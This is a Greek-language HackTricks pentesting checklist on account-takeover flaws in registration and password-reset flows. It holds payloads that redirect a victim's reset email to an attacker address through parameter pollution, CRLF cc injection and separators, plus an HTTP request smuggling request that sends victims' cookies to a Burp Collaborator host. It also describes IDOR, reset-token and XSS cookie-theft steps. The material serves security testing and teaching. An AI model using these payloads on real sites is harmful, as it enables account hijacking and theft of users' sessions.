# Ευπάθειες Εγγραφής και Κατάληψης

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Κατάληψη Εγγραφής

### Διπλή Εγγραφή

* Δοκιμάστε να δημιουργήσετε έναν υπάρχοντα χρήστη
* Ελέγξτε ποικίλες μορφές του email:
* κεφαλαία γράμματα
* \+1@
* προσθέστε μερικούς τελείες στο email
* ειδικοί χαρακτήρες στο όνομα του email (%00, %09, %20)
* Βάλτε μαύρους χαρακτήρες μετά το email: `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### Αποκάλυψη Ονόματος Χρήστη

Ελέγξτε αν μπορείτε να καταλάβετε πότε ένα όνομα χρήστη έχει ήδη καταχωρηθεί στην εφαρμογή.

### Πολιτική Κωδικού Πρόσβασης

Δημιουργώντας έναν χρήστη ελέγξτε την πολιτική κωδικού πρόσβασης (ελέγξτε αν μπορείτε να χρησιμοποιήσετε αδύναμους κωδικούς πρόσβασης).\
Σε αυτήν την περίπτωση μπορείτε να δοκιμάσετε να κάνετε brute force στα διαπιστευτήρια.

### Ενέσιμη SQL

[**Ελέγξτε αυτήν τη σελίδα**](sql-injection/#insert-statement) για να μάθετε πώς να προσπαθήσετε να καταλάβετε λογαριασμούς ή να εξάγετε πληροφορίες μέσω **ενεσίμων SQL** σε φόρμες εγγραφής.

### Κατάληψη Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### Ευπάθειες SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Αλλαγή Email

Όταν είστε εγγεγραμμένος, δοκιμάστε να αλλάξετε το email και ελέγξτε αν αυτή η αλλαγή επικυρώνεται σωστά ή μπορείτε να το αλλάξετε σε αυθαίρετα emails.

### Περισσότεροι Έλεγχοι

* Ελέγξτε αν μπορείτε να χρησιμοποιήσετε **προσωρινά emails**
* **Μακρύς** **κωδικός πρόσβασης** (>200) οδηγεί σε **DoS**
* **Ελέγξτε τα όρια ρυθμού στη δημιουργία λογαριασμού**
* Χρησιμοποιήστε το username@**burp\_collab**.net και αναλύστε την **ανάκληση κλήσης**
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR στις παραμέτρους του API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Ο επιτιθέμενος πρέπει να συνδεθεί με τον λογαριασμό του και να μεταβεί στη λειτουργία **Αλλαγή κωδικού πρόσβασης**.
2. Ξεκινήστε το Burp Suite και παρεμβάλλετε το αίτημα.
3. Στείλτε το στην καρτέλα repeater και επεξεργαστείτε τις παραμέτρους: Αναγνωριστικό χρήστη/ηλεκτρονικό ταχυδρομείο\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Αδύναμο διακριτικό επαναφοράς κωδικού πρόσβασης <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Το διακριτικό επαναφοράς κωδικού πρόσβασης πρέπει να δημιουργείται τυχαία και να είναι μοναδικό κάθε φορά.\
Προσπαθήστε να καθορίσετε εάν το διακριτικό λήγει ή εάν είναι πάντα το ίδιο, σε ορισμένες περιπτώσεις ο αλγόριθμος δημιουργίας είναι αδύναμος και μπορεί να μαντευτεί. Οι παρακάτω μεταβλητές μπορεί να χρησιμοποιηθούν από τον αλγόριθμο.

* Χρονική σήμανση
* Αναγνωριστικό χρήστη
* Ηλεκτρονικό ταχυδρομείο του χρήστη
* Όνομα και επώνυμο
* Ημερομηνία γέννησης
* Κρυπτογραφία
* Μόνο αριθμοί
* Μικρή ακολουθία διακριτικού (χαρακτήρες μεταξύ \[A-Z,a-z,0-9])
* Επαναχρησιμοποίηση διακριτικού
* Ημερομηνία λήξης διακριτικού

### Διαρροή διακριτικού επαναφοράς κωδικού πρόσβασης <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Ενεργοποιήστε ένα αίτημα επαναφοράς κωδικού πρόσβασης χρησιμοποιώντας το API/UI για ένα συγκεκριμένο ηλεκτρονικό ταχυδρομείο, π.χ.: test@mail.com
2. Επιθεωρήστε την απάντηση του διακομιστή και ελέγξτε για το `resetToken`
3. Στη συνέχεια, χρησιμοποιήστε το διακριτικό σε ένα URL όπως `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Επαναφορά κωδικού πρόσβασης μέσω σύγκρουσης ονομάτων χρηστών <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Εγγραφείτε στο σύστημα με ένα όνομα χρήστη που είναι πανομοιότυπο με το όνομα χρήστη του θύματος, αλλά με κενά που έχουν εισαχθεί πριν και/ή μετά από το όνομα χρήστη, π.χ.: `"admin "`
2. Ζητήστε επαναφορά κωδικού πρόσβασης με το κακόβουλο όνομα χρήστη.
3. Χρησιμοποιήστε το διακριτικό που στάλθηκε στο ηλεκτρονικό σας ταχυδρομείο και επαναφέρετε τον κωδικό πρόσβασης του θύματος.
4. Συνδεθείτε στον λογαριασμό του θύματος με τον νέο κωδικό πρόσβασης.

Η πλατφόρμα CTFd ήταν ευάλωτη σε αυτήν την επίθεση.\
Δείτε: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Κατάληψη λογαριασμού μέσω Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Βρείτε ένα XSS μέσα στην εφαρμογή ή ένα υποτομέα αν τα cookies είναι περιορισμένα στο γονικό τομέα: `*.domain.com`
2. Διαρρεύστε το τρέχον **cookie συνεδρίας**
3. Πιστοποιηθείτε ως ο χρήστης χρησιμοποιώντας το cookie

### Κατάληψη λογαριασμού μέσω HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Χρησιμοποιήστε το **smuggler** για να ανιχνεύσετε τον τύπο του HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Δημιουργήστε ένα αίτημα που θα αντικαταστήσει το `POST / HTTP/1.1` με τα παρακάτω δεδομένα:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` με στόχο την ανακατεύθυνση των θυμάτων στο burpcollab και την κλοπή των cookies τους\
3. Το τελικό αίτημα μπορεί να μοιάζει με το παρακάτω
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Αναφορές από το Hackerone που εκμεταλλεύονται αυτό το σφάλμα\
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Κατάληψη λογαριασμού μέσω CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Δημιουργήστε ένα φορτίο για το CSRF, π.χ. "Φόρμα HTML με αυτόματη υποβολή για αλλαγή κωδικού πρόσβασης"
2. Αποστείλετε το φορτίο

### Κατάληψη λογαριασμού μέσω JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

Το JSON Web Token μπορεί να χρησιμοποιηθεί για την πιστοποίηση ενός χρήστη.

* Επεξεργαστείτε το JWT με ένα άλλο ID χρήστη / Email
* Ελέγξτε για αδύναμη υπογραφή JWT

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Αναφορές

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
